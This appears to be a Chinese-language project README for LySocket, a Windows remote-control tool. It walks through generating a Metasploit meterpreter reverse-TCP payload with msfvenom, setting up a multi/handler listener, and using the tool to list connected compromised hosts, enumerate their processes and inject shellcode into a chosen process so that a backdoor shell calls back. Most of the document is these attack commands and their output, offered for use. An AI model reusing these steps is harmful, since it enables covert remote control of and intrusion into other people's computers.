# LySocket 远程Shell植入远控

<br>

<div align=center>

![logo](https://user-images.githubusercontent.com/52789403/191662936-77e48078-82ed-4d9b-8ae2-c1df303ed5aa.png)

</div>

<br>

LySocket 是一款使用纯 `WindowsAPI` 实现的命令行版远程控制工具，该工具通过最少的代码实现了套接字的批量管理操作，用户可以指定对远程主机内特定进程注入`ShellCode`载荷，只要对端`LyClient`客户端能一直运行，则`Metasploit`攻击载荷就可以很方便的注入到目标主机任意的进程内反弹。

首先需要通过`Metasploit`工具生成一个有效载荷。
```
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置，使用时需要与载荷的位数相对应。
```
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```



```C
[ LySocket ] # help
 _            ____             _        _
| |   _   _  / ___|  ___   ___| | _____| |_
| |  | | | | \___ \ / _ \ / __| |/ / _ \ __|
| |__| |_| |  ___) | (_) | (__|   <  __/ |_
|_____\__, | |____/ \___/ \___|_|\_\___|\__|
      |___/

Usage: LySocket 演示版
Email: me@lyshark.com
Optional:

         --ShowSocket        输出所有上线客户端
         --GetCPU            获取客户端CPU数据
         --GetMemory         获取客户端内存数据
         --GetProcessList    获取客户端正在运行进程列表
         --InjectSelfCode    将ShellCode注入到客户端内
         --InjectRemoteCode  将ShellCode注入到客户端指定进程内
         --CloseServer       正常退出服务端
         --Exit              退出远程客户端
```

命令`ShowSocket`可输出当前有多少肉鸡上线了，用于确定对端IP地址，该套接字列表程序内会自动维护，如果客户端下线则Socket套接字将会被清理。
```C
[ LySocket ] # ShowSocket
--------------------------------------------------------------------
索引             客户端地址              端口            状态
--------------------------------------------------------------------
0                127.0.0.1               1763            Open
1                127.0.0.1               1806            Open
2                127.0.0.1               1807            Open
3                127.0.0.1               1808            Open
--------------------------------------------------------------------
[ LySocket ] #
```
命令`GetCPU,GetMemory`可用于得到对点主机信息，目前只是作为演示案例使用。
```C
[ LySocket ] # GetCPU --address 127.0.0.1
--------------------------------------------------------------------
CPUID: 3219913727
CPU型号: GenuineIntel
idle: 18281250
kernel: 18437500
user: 312500
cpu: 2
--------------------------------------------------------------------

[ LySocket ] # GetMemory --address 127.0.0.1
--------------------------------------------------------------------
内存总量                 内存剩余                内存已使用
--------------------------------------------------------------------
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
16219 MB                 10953 MB                5266 MB
--------------------------------------------------------------------
```
命令`GetProcessList`可用于得到对段主机内有哪些进程正在运行，这是注入代码的前提条件。
```C
[ LySocket ] # GetProcessList --address 127.0.0.1
--------------------------------------------------------------------
索引             进程PID                 进程位数                进程名
--------------------------------------------------------------------
0                4       x64             System
1                124     x64             Registry
2                568     x64             smss.exe
3                856     x64             csrss.exe
4                956     x64             wininit.exe
5                964     x64             csrss.exe
6                80      x64             services.exe
7                484     x64             lsass.exe
8                564     x64             winlogon.exe
9                672     x64             svchost.exe
10               1060    x64             fontdrvhost.exe
11               1068    x64             fontdrvhost.exe
12               1100    x64             WUDFHost.exe
--------------------------------------------------------------------
```
得到了特定继承的PID序号以后，就可以使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
```C
[ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
[+] Success..
[ LySocket ] #
```
